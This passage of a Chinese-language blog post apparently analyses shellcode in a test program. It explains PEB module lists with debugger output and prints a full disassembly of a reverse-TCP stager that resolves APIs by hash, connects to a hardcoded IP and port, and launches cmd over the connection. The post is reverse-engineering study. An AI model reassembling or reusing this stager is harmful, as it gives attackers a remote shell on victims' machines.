+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !peb</span><br><span class="line">PEB at 0024b000</span><br><span class="line">    InheritedAddressSpace:    No</span><br><span class="line">    ReadImageFileExecOptions: No</span><br><span class="line">    BeingDebugged:            Yes</span><br><span class="line">    ImageBaseAddress:         00ca0000</span><br><span class="line">    NtGlobalFlag:             <span class="number">70</span></span><br><span class="line">    NtGlobalFlag2:            <span class="number">0</span></span><br><span class="line">    Ldr                       77f75d80</span><br><span class="line">    Ldr.Initialized:          Yes</span><br><span class="line">    Ldr.InInitializationOrderModuleList: 00583760 . 005857f0</span><br><span class="line">    Ldr.InLoadOrderModuleList:           00583858 . <span class="number">0058e620</span></span><br><span class="line">    Ldr.InMemoryOrderModuleList:         00583860 . <span class="number">0058e628</span></span><br><span class="line">            Base TimeStamp                     Module</span><br><span class="line">          ca0000 677e8efc Jan 08 <span class="number">22</span>:<span class="number">43</span>:08 <span class="number">2025</span> C:\Users\Aiyakami\Desktop\trust\shellcodeTest.exe</span><br><span class="line">        <span class="number">77e50000</span> 6ce0f861 Nov <span class="number">20</span> <span class="number">11</span>:<span class="number">56</span>:<span class="number">17</span> <span class="number">2027</span> C:\WINDOWS\SYSTEM32\ntdll.dll</span><br><span class="line">        <span class="number">76100000</span> C:\WINDOWS\System32\KERNEL32.DLL</span><br><span class="line">        <span class="number">76300000</span> C:\WINDOWS\System32\KERNELBASE.dll</span><br><span class="line">        <span class="number">6e880000</span> C:\WINDOWS\SYSTEM32\apphelp.dll</span><br><span class="line">        <span class="number">75e60000</span> 6763d3a2 Dec <span class="number">19</span> <span class="number">16</span>:<span class="number">04</span>:<span class="number">50</span> <span class="number">2024</span> C:\WINDOWS\System32\ucrtbase.dll</span><br><span class="line">        75cb0000 C:\WINDOWS\SYSTEM32\VCRUNTIME140.dll</span><br></pre></td></tr></table></figure>
+
+<p><strong>InInitializationOrderModuleList</strong>：按模块初始化顺序排列的链表。</p>
+<p><strong>InLoadOrderModuleList</strong>：按模块加载顺序排列的链表。</p>
+<p><strong>InMemoryOrderModuleList</strong>：按模块在内存中加载顺序排列的链表。</p>
+<p>上述dump中InLoadOrderModuleList，InInitializationOrderModuleList都还没有值是因为程序还没加载完成所以操作系统还没有值</p>
+<p>​<img src="https://aiyakami.github.io/about/6/wps4-20250206203710-2u84v00.jpg">​</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:0040406B                 mov     edx, fs:[eax+30h]<span class="comment">//进程环境块PEB位置</span></span><br><span class="line">.data:<span class="number">0040406F</span>                 mov     edx, [edx+0Ch]<span class="comment">//模块列表（LDR）的地址</span></span><br><span class="line">.data:<span class="number">00404072</span>                 mov     edx, [edx+14h]<span class="comment">//InMemoryOrderModuleList首模块（应该是进程自身）</span></span><br><span class="line">.data:<span class="number">00404075</span>                 mov     esi, [edx+28h]<span class="comment">//BaseDllName#buffer字段  </span></span><br><span class="line">.data:00404078                 movzx   ecx, word ptr [edx+26h]<span class="comment">//BaseDllName#MaximumLength字段</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://aiyakami.github.io/about/6/wps5-20250206203710-5v8xo0h.jpg">​</p>
+<p>对应的结构</p>
+<p>​<img src="https://aiyakami.github.io/about/6/wps6-20250206203710-lpk6lfr.jpg">​</p>
+<p><strong>整理的有点乱，上述是对于手动查找kernelbase的汇编代码进行研究，实际上的网上能找到的有多种不同的汇编代码都能实现，原因是可以分别通过下面三张表找到，用的表不同时，汇编代码就会有所不同：</strong></p>
+<p><strong>InInitializationOrderModuleList：按模块初始化顺序排列的链表。</strong></p>
+<p><strong>InLoadOrderModuleList：按模块加载顺序排列的链表。</strong></p>
+<p><strong>InMemoryOrderModuleList：按模块在内存中加载顺序排列的链表。</strong></p>
+<p>直接XDBG中dump下来，其内容如下，除了动态获取kernelbase调用api的部分比较难理解，后续的建立TCP反向连接，和接收远程shellcode并分配内存执行就不深入研究了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">00CA4060 | FC                       | cld                                 </span><br><span class="line">00CA4061 | E8 82000000              | call shellcodetest.CA40E8           </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//通过hash值动态调用函数（此处算法需要改）</span><br><span class="line">00CA4066 | 60                       | pushad                              </span><br><span class="line">00CA4067 | 89E5                     | mov ebp,esp                         </span><br><span class="line">00CA4069 | 31C0                     | xor eax,eax                         </span><br><span class="line">00CA406B | 64:8B50 30               | mov edx,dword ptr fs:[eax+30]       </span><br><span class="line">00CA406F | 8B52 0C                  | mov edx,dword ptr ds:[edx+C]        </span><br><span class="line">00CA4072 | 8B52 14                  | mov edx,dword ptr ds:[edx+14]       </span><br><span class="line">00CA4075 | 8B72 28                  | mov esi,dword ptr ds:[edx+28]      </span><br><span class="line">00CA4078 | 0FB74A 26                | movzx ecx,word ptr ds:[edx+26]     </span><br><span class="line">00CA407C | 31FF                     | xor edi,edi                        </span><br><span class="line">00CA407E | AC                       | lodsb                              </span><br><span class="line">00CA407F | 3C 61                    | cmp al,61                           </span><br><span class="line">00CA4081 | 7C 02                    | jl shellcodetest.CA4085             </span><br><span class="line">00CA4083 | 2C 20                    | sub al,20                           </span><br><span class="line">00CA4085 | C1CF 0D                  | ror edi,D                           </span><br><span class="line">00CA4088 | 01C7                     | add edi,eax                        </span><br><span class="line">00CA408A | E2 F2                    | loop shellcodetest.CA407E           </span><br><span class="line">00CA408C | 52                       | push edx                            </span><br><span class="line">00CA408D | 57                       | push edi                            </span><br><span class="line">00CA408E | 8B52 10                  | mov edx,dword ptr ds:[edx+10]      </span><br><span class="line">00CA4091 | 8B4A 3C                  | mov ecx,dword ptr ds:[edx+3C]      </span><br><span class="line">00CA4094 | 8B4C11 78                | mov ecx,dword ptr ds:[ecx+edx+78]   </span><br><span class="line">00CA4098 | E3 48                    | jecxz shellcodetest.CA40E2          </span><br><span class="line">00CA409A | 01D1                     | add ecx,edx                         </span><br><span class="line">00CA409C | 51                       | push ecx                            </span><br><span class="line">00CA409D | 8B59 20                  | mov ebx,dword ptr ds:[ecx+20]       </span><br><span class="line">00CA40A0 | 01D3                     | add ebx,edx                         </span><br><span class="line">00CA40A2 | 8B49 18                  | mov ecx,dword ptr ds:[ecx+18]       </span><br><span class="line">00CA40A5 | E3 3A                    | jecxz shellcodetest.CA40E1          </span><br><span class="line">00CA40A7 | 49                       | dec ecx                             </span><br><span class="line">00CA40A8 | 8B348B                   | mov esi,dword ptr ds:[ebx+ecx*4]    </span><br><span class="line">00CA40AB | 01D6                     | add esi,edx                        </span><br><span class="line">00CA40AD | 31FF                     | xor edi,edi                        </span><br><span class="line">00CA40AF | AC                       | lodsb                              </span><br><span class="line">00CA40B0 | C1CF 0D                  | ror edi,D                           </span><br><span class="line">00CA40B3 | 01C7                     | add edi,eax                         </span><br><span class="line">00CA40B5 | 38E0                     | cmp al,ah                          </span><br><span class="line">00CA40B7 | 75 F6                    | jne shellcodetest.CA40AF          </span><br><span class="line">00CA40B9 | 037D F8                  | add edi,dword ptr ss:[ebp-8]       </span><br><span class="line">00CA40BC | 3B7D 24                  | cmp edi,dword ptr ss:[ebp+24]      </span><br><span class="line">00CA40BF | 75 E4                    | jne shellcodetest.CA40A5            </span><br><span class="line">00CA40C1 | 58                       | pop eax                            </span><br><span class="line">00CA40C2 | 8B58 24                  | mov ebx,dword ptr ds:[eax+24]      </span><br><span class="line">00CA40C5 | 01D3                     | add ebx,edx                         </span><br><span class="line">00CA40C7 | 66:8B0C4B                | mov cx,word ptr ds:[ebx+ecx*2]     </span><br><span class="line">00CA40CB | 8B58 1C                  | mov ebx,dword ptr ds:[eax+1C]      </span><br><span class="line">00CA40CE | 01D3                     | add ebx,edx                       </span><br><span class="line">00CA40D0 | 8B048B                   | mov eax,dword ptr ds:[ebx+ecx*4]   </span><br><span class="line">00CA40D3 | 01D0                     | add eax,edx                         </span><br><span class="line">00CA40D5 | 894424 24                | mov dword ptr ss:[esp+24],eax      </span><br><span class="line">00CA40D9 | 5B                       | pop ebx                            </span><br><span class="line">00CA40DA | 5B                       | pop ebx                          </span><br><span class="line">00CA40DB | 61                       | popad                              </span><br><span class="line">00CA40DC | 59                       | pop ecx                            </span><br><span class="line">00CA40DD | 5A                       | pop edx                            </span><br><span class="line">00CA40DE | 51                       | push ecx                           </span><br><span class="line">00CA40DF | FFE0                     | jmp eax                           </span><br><span class="line">00CA40E1 | 5F                       | pop edi                            </span><br><span class="line">00CA40E2 | 5F                       | pop edi                            </span><br><span class="line">00CA40E3 | 5A                       | pop edx                            </span><br><span class="line">00CA40E4 | 8B12                     | mov edx,dword ptr ds:[edx]        </span><br><span class="line">00CA40E6 | EB 8D                    | jmp shellcodetest.CA4075          </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//建立TCP反向连接  这一段中的call ebp就是call上面一个函数</span><br><span class="line">00CA40E8 | 5D                       | pop ebp                           </span><br><span class="line">00CA40E9 | 68 33320000              | push 3233                          </span><br><span class="line">00CA40EE | 68 7773325F              | push 5F327377                     </span><br><span class="line">00CA40F3 | 54                       | push esp                           </span><br><span class="line">00CA40F4 | 68 4C772607              | push 726774C                      </span><br><span class="line">00CA40F9 | FFD5                     | call ebp                          </span><br><span class="line">00CA40FB | B8 90010000              | mov eax,190                         </span><br><span class="line">00CA4100 | 29C4                     | sub esp,eax                         </span><br><span class="line">00CA4102 | 54                       | push esp                           </span><br><span class="line">00CA4103 | 50                       | push eax                            </span><br><span class="line">00CA4104 | 68 29806B00              | push 6B8029                         </span><br><span class="line">00CA4109 | FFD5                     | call ebp                           </span><br><span class="line">00CA410B | 50                       | push eax                            </span><br><span class="line">00CA410C | 50                       | push eax                           </span><br><span class="line">00CA410D | 50                       | push eax                            </span><br><span class="line">00CA410E | 50                       | push eax                            </span><br><span class="line">00CA410F | 40                       | inc eax                             </span><br><span class="line">00CA4110 | 50                       | push eax                            </span><br><span class="line">00CA4111 | 40                       | inc eax                             </span><br><span class="line">00CA4112 | 50                       | push eax                            </span><br><span class="line">00CA4113 | 68 EA0FDFE0              | push E0DF0FEA                       </span><br><span class="line">00CA4118 | FFD5                     | call ebp                           </span><br><span class="line">00CA411A | 97                       | xchg edi,eax                       </span><br><span class="line">00CA411B | 6A 05                    | push 5                              </span><br><span class="line">00CA411D | 68 C0A80101              | push 101A8C0   主机ip地址                     </span><br><span class="line">00CA4122 | 68 02000457              | push 57040002  主机端口号                     </span><br><span class="line">00CA4127 | 89E6                     | mov esi,esp                         </span><br><span class="line">00CA4129 | 6A 10                    | push 10                             </span><br><span class="line">00CA412B | 56                       | push esi                            </span><br><span class="line">00CA412C | 57                       | push edi                            </span><br><span class="line">00CA412D | 68 99A57461              | push 6174A599                       </span><br><span class="line">00CA4132 | FFD5                     | call ebp                            </span><br><span class="line">00CA4134 | 85C0                     | test eax,eax                        </span><br><span class="line">00CA4136 | 74 0C                    | je shellcodetest.CA4144             </span><br><span class="line">00CA4138 | FF4E 08                  | dec dword ptr ds:[esi+8]           </span><br><span class="line">00CA413B | 75 EC                    | jne shellcodetest.CA4129            </span><br><span class="line">00CA413D | 68 F0B5A256              | push 56A2B5F0                       </span><br><span class="line">00CA4142 | FFD5                     | call ebp                           </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//如果连接成功 接收并执行命令</span><br><span class="line">00CA4144 | 68 636D6400              | push 646D63                         </span><br><span class="line">00CA4149 | 89E3                     | mov ebx,esp                         </span><br><span class="line">00CA414B | 57                       | push edi                          </span><br><span class="line">00CA414C | 57                       | push edi                           </span><br><span class="line">00CA414D | 57                       | push edi                          </span><br><span class="line">00CA414E | 31F6                     | xor esi,esi                       </span><br><span class="line">00CA4150 | 6A 12                    | push 12                             </span><br><span class="line">00CA4152 | 59                       | pop ecx                             </span><br><span class="line">00CA4153 | 56                       | push esi                           </span><br><span class="line">00CA4154 | E2 FD                    | loop shellcodetest.CA4153           </span><br><span class="line">00CA4156 | 66:C74424 3C 0101        | mov word ptr ss:[esp+3C],101        </span><br><span class="line">00CA415D | 8D4424 10                | lea eax,dword ptr ss:[esp+10]       </span><br><span class="line">00CA4161 | C600 44                  | mov byte ptr ds:[eax],44           </span><br><span class="line">00CA4164 | 54                       | push esp                            </span><br><span class="line">00CA4165 | 50                       | push eax                            </span><br><span class="line">00CA4166 | 56                       | push esi                         </span><br><span class="line">00CA4167 | 56                       | push esi                          </span><br><span class="line">00CA4168 | 56                       | push esi                           </span><br><span class="line">00CA4169 | 46                       | inc esi                           </span><br><span class="line">00CA416A | 56                       | push esi                          </span><br><span class="line">00CA416B | 4E                       | dec esi                            </span><br><span class="line">00CA416C | 56                       | push esi                          </span><br><span class="line">00CA416D | 56                       | push esi                          </span><br><span class="line">00CA416E | 53                       | push ebx                          </span><br><span class="line">00CA416F | 56                       | push esi                          </span><br><span class="line">00CA4170 | 68 79CC3F86              | push 863FCC79                       </span><br><span class="line">00CA4175 | FFD5                     | call ebp                          </span><br><span class="line">00CA4177 | 89E0                     | mov eax,esp                         </span><br><span class="line">00CA4179 | 4E                       | dec esi                            </span><br><span class="line">00CA417A | 56                       | push esi                           </span><br><span class="line">00CA417B | 46                       | inc esi                           </span><br><span class="line">00CA417C | FF30                     | push dword ptr ds:[eax]             </span><br><span class="line">00CA417E | 68 08871D60              | push 601D8708                       </span><br><span class="line">00CA4183 | FFD5                     | call ebp                           </span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/4.jpg" data-sizes="auto" alt="伪装todesk安装程序病毒分析" class="lazyload">
+        
+      
+      <a href="/2025/02/06/%E4%BC%AA%E8%A3%85todesk%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          伪装todesk安装程序病毒分析
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="aiyakami" class="lazyload">
+  <div class="sidebar-author-name">aiyakami</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep"></span>
+      aiyakami
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        9.2k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        00:37
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="aiyakami" class="lazyload">
+  <div class="sidebar-author-name">aiyakami</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
